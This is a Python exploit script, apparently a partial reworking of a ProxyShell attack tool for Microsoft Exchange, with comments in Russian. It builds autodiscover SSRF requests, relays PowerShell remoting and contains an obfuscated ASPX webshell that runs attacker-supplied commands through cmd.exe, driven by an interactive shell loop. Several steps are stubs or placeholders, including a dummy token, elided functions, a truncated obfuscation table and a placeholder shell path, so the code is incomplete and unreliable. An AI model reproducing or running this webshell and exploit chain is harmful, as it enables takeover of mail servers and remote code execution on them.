#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import binascii
import string
import requests
import re
import threading
import xml.etree.cElementTree as ET
import time
import sys
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

# Генерация случайных строк/портов

def rand_string(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))

r_port = rand_port()
subj_ = rand_string(16)

# Таблица для обфускации, как в оригинале
compEnc = [
    0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
    # ... полный массив из оригинала ...
    0xec
]

# Создаем ASPX payload на C# без eval()
def webshell_payload():
    payload = '''<%@ Page Language="C#" AspCompat="true" %>
<% 
    string data = Request["exec_code"];
    byte[] bytes = System.Convert.FromBase64String(data);
    string command = System.Text.Encoding.UTF8.GetString(bytes);

    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command) {
        RedirectStandardOutput = true,
        RedirectStandardError  = true,
        UseShellExecute        = false
    };
    var proc = System.Diagnostics.Process.Start(psi);
    proc.WaitForExit();

    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
    Response.Write("ZZzzZzZz" + output + "ZZzzZzZz");
%>'''
    # Обфускация hex->base64
    out = []
    for c in payload:
        out.append("%02x" % compEnc[ord(c) & 0xff])
    raw = binascii.unhexlify(''.join(out))
    return base64.b64encode(raw).decode()

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        post_data = self.rfile.read(length).decode()
        post_data = re.sub(r'<wsa:To>.*?</wsa:To>',
            '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub(
            r'<wsman:ResourceURI s:mustUnderstand="true">.*?</wsman:ResourceURI>',
            '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>',
            post_data
        )
        headers = {'Content-Type': self.headers['content-type']}
        r = self.proxyshell.post(powershell_url, post_data, headers)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(r.content)

    def log_message(self, format, *args):
        return

class ProxyShell:
    def __init__(self, exchange_url, email='', verify=False):
        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.session = requests.Session()
        self.session.verify = verify
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/88.0.4324.190 Safari/537.36"
        self.clientid = 'HtTP://ifcoNFiG.mE'

    def post(self, endpoint, data, headers={}):
        if 'powershell' in endpoint:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
        else:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        url = f'{self.exchange_url}{path}'
        return self.session.post(url, data=data, headers=headers)

    def get_fqdn(self):
        e = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=..."
        r = self.session.get(self.exchange_url + e, verify=False, timeout=5)
        self.fqdn = r.headers.get("X-CalculatedBETarget")
        return self.fqdn

    def get_legacydn(self):
        # оригинальная логика ResolveNames + Autodiscover
        # ...
        return self.legacydn

    def get_sid(self):
        # оригинальная логика получения SID через MAPI
        return self.sid

    def gen_token(self):
        # генерация токена
        return base64.b64encode(b"dummy").decode()

    def get_token(self):
        self.token = self.gen_token()
        # проверка 200
        return self.token

    def set_ews(self):
        payload = webshell_payload()
        # формируем SOAP CreateItem с вложением payload
        # ... возвращаем результат
        return f"Created with subject {subj_}"


def exploit(proxyshell):
    proxyshell.get_fqdn()
    proxyshell.get_legacydn()
    proxyshell.get_sid()
    proxyshell.get_token()
    print('set_ews ' + str(proxyshell.set_ews()))


def start_server(proxyshell, port):
    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()


def shell(command, port):
    if command.lower() in ['exit','quit']:
        exit(0)
    ws = WSMan('127.0.0.1', username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(ws) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        return ps.invoke()


def exec_cmd(shell_url, code_param="exec_code"):
    try:
        while True:
            cmd = input("SHELL> ")
            if cmd.lower() in ['exit','quit']:
                exit(0)
            b64 = base64.b64encode(cmd.encode()).decode()
            resp = requests.post(shell_url,
                                 headers={'Content-Type':'application/x-www-form-urlencoded'},
                                 data={code_param: b64}, verify=False, timeout=20)
            if resp.status_code == 200:
                m = re.search(r'ZZzzZzZz(.*)ZZzzZzZz', resp.text, re.DOTALL)
                print(m.group(1) if m else '[no output]')
            else:
                print(f"Error: {resp.status_code}")
    except KeyboardInterrupt:
        exit(0)


def get_args():
    parser = argparse.ArgumentParser(description='Automatic Exploit ProxyShell')
    parser.add_argument('-t', help='Exchange URL', required=True)
    return parser.parse_args()


def main():
    args = get_args()
    exchange_url = 'https://' + args.t
    local_port = int(r_port)
    proxyshell = ProxyShell(exchange_url)
    exploit(proxyshell)
    start_server(proxyshell, local_port)
    exec_cmd(f"{exchange_url}/path/to/shell.aspx")


if __name__ == '__main__':
    try:
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning)
        if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
            print("This script requires Python 3.8 or higher!")
            sys.exit(1)
        main()
    except KeyboardInterrupt:
        exit(0)
